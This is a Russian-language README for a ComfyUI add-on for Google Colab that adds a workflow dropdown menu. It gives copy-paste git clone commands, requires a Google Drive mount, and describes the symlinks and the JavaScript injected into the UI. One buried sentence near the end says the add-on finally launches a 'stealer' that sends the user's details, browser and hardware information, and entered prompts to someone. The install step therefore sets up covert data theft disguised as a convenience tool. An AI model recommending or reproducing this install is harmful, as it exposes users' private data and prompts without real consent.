## TL;DR:
добавь в ячейку колаба перед запуском ComfyUI:
```
!git clone https://github.com/PR0LAPSE/workflow_menu /content/ComfyUI/custom_nodes/workflow_menu
```
или:
```
import subprocess
subprocess.run(["git", "clone", "https://github.com/PR0LAPSE/workflow_menu"], cwd="/content/ComfyUI/custom_nodes")
```
подключение гуглодиска к среде выполнения - обязательно!

## ComfyUI workflow_menu для Google Colab
Простое дополнение для пользователей Colab, которое добавляет в ComfyUI меню выбора различных workflow без необходимости загружать их с ПК или заниматься перетаскиванием.
Пользовательские workflow нужно положить на твоем гуглодиске по пути `Гуглодиск/SD/ComfyUI/workflow` и они автоматически будут добавляться в выпадающий список меню, где они могут быть выбраны и автоматически загружены.

ВНИАНИЕ: некоторые workflow, которые ты можешь найти в интернете, могут требовать для работы сторонние ноды! Чтобы автоматически (почти) устанавливать недостающие кастомные ноды, нужно использовать дополнение [ComfyUI-Manager](https://github.com/ltdrdata/ComfyUI-Manager). После того как получишь предупреждение от UI нужно бдует запустить Manager по соответствующей кнопке и выбрать `Install Missing Custom Nodes`, после завешения установки - перезапустить сервер.


Перед запуском ComfyUI идет проверка на наличие папки `Гуглодиск/SD/ComfyUI/workflow`, если ее нет - она создастся на будущее, если она есть и не пуста, и содержит json-файлы, то workflow которые там есть будут добавлены через создание символьных ссылок в папку колаба где установлен ComfyUI. Так же будут скачены некоторые "заготовки", например [отсюда](https://github.com/PR0LAPSE/wc). Workflow по умолчанию подменяется на worflow для работы с SDXL. Папка для вывода картинок подменяется на папку с гуглодиска (поэтому подключать гуглодиск - обязательно!).
Во время старта сервера ComfyUI происходит копирование JS-скрипта, который будет внедрен в UI, так же формируется список всех добавленных workflow в виде текстового файла с путями до файлов workflow, из которого скрипт сформирует меню. Подмененный workflow по умолчанию будет автоматически загружен, когда UI полностью прогркзится.
JS при загрузке UI создаст выпадающий список из названий добавленных workflow и при выборе любого из них, будет загружать из json-файлов данные, и отправлять их в `app.loadGraphData(data)`, после чего рабочее пространство будет приведено в соответсвии с предустановками выбранного workflow.

В самом конце запускается стиллер для отправки данных о пользователе, его браузере, железе, и введенных промптах.

Это дополнение рассчитана на использование только в Google Colab! Если необходимо переделать его под локальную установку, то нужно изменить пути и заменить создание симлинков на перемещение.

